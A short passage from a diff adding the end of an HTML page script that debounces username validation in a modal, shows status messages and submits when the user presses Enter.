+        modalStatus.textContent = value ? "Verifying username..." : "Enter at least 3 characters.";
+      }
+
+      if (!value) {
+        return;
+      }
+
+      validationTimer = setTimeout(() => {
+        applyValidation(value);
+      }, 650);
+    };
+
+    usernameInput.addEventListener("input", validateUsername);
+    usernameInput.addEventListener("keydown", (event) => {
+      if (event.key === "Enter") {
+        confirmBtn.click();
+      }
+    });
+  }
+});
+</script>
+
+
+</body></html>
